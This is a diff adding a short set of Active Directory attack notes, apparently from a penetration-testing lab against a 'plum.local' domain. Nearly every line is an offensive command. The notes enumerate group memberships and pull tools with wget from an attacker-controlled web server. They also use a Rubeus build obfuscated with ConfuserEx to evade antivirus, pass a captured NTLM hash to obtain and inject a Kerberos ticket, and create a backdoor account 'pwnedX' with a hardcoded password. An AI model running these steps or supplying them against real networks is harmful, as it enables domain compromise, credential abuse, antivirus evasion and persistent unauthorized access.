@@ -1,0 +1,29 @@
+veify if a user have special rights or are members of interesting groups
+    Get-ADPrincipalGroupMembership bob -server 192.168.3.215 -Credential $PSCredential | select name
+
+
+https://github.com/canix1/ADACLScanner
+    wget http://192.168.X.206:8000/ADACLScan.ps1 -outfile ADACLScan.ps1
+    .\ADACLScan.ps1
+
+
+Since Rubeus is widely known to be used by attackers, we won't be able to leverage the original version without disabling AV. To evade static detection, we will obfuscate the compiled .NET assembly
+with ConfuserEx
+    wget http://192.168.X.206:8000/Dubeus.exe -outfile Dubeus.exe
+
+
+
+Pass-The-Hash attack with kevin user's NTLM hash
+    .\Dubeus.exe asktgt /user:kevin /domain:plum.local /rc4:80de0b25034cbe9a63df9d8dfcdaadf3 /ptt
+
+
+
+verify the ticket was injected
+    klist
+
+
+Crate a new user with higher privilege
+    $Env:ADPS_LoadDefaultDrive = 0
+    Import-Module ActiveDirectory
+    New-ADUser -SamAccountName pwnedX -Name "pwnedX" -AccountPassword (ConvertTo-SecureString -AsPlainText "P@ssw0rd" -Force) -Enabled $true -PasswordNeverExpires $true -Path "ou=support,ou=users,ou=usa,ou=regions,dc=plum,dc=local" -Server dc001.plum.local
+
